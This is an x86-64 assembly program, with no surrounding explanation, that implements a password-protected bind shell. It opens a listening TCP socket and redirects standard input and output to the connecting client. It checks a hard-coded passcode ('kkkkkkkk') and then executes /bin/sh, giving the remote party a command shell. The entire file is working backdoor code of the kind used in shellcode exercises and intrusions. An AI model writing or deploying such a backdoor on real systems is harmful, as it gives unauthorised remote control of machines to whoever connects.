global _start

section .text

_start:

 	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, rdx
	syscall

	mov rdi, rax
	xor rax, rax
	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x423
	mov word [rsp-8], 0x2
	sub rsp, 8

	mov rax, 49
	mov rsi, rsp
	mov rdx, 16
	syscall

	mov rax, 50
	mov rsi, 2
	syscall

	mov rax, 43
	sub rsp, 16
	mov rsi, rsp
	mov byte [rsp-1], 16
	sub rsp, 1
	mov rdx, rsp
	syscall

	mov r9, rax
	mov rax, 3
	syscall

	mov rdi, r9
	mov rax, 33
	mov rsi, 0
	syscall

	mov rax, 33
	mov rsi, 1
	syscall

	mov rax, 33
	mov rsi, 2
	syscall

	jmp prompt

passcode:

	; print
	pop rsi
	mov rax, 1
	mov rdi, 1
	mov rdx, 10
	syscall

	; read
	mov rax, 0
	mov rdi, 0
	sub rsp, 8
	mov rsi, rsp
	mov rdx, 8
	syscall

	; compare
	cld
	mov rax, [pass]
	mov rdi, [rsi]
	xor rax, rdi
	cmp rax, 0

	je shell

	; print
	pop rbx
	xor rbx, rbx
	push rbx

	mov rax, 1
	mov rdi, 1
	mov rdx, 16
	lea rsi, [warn]
	syscall

	; shutdown
	mov rax, 48
	mov rdi, r9
	mov rsi, 2
	syscall

prompt:

	call passcode
	hello: db 'Passcode: '

shell:

	; +===== /bin/sh ======+

	xor rax, rax
	mov rbx, 0x68732f2f6e69622f

	push rax
	push rbx

	mov rdi, rsp

	push rax
	push rdi

	mov rsi, rsp

	mov rax, 59
	xor rdx, rdx
	syscall

section .data

	pass: dq "kkkkkkkk"
	warn: db "Good try :)", 0xa
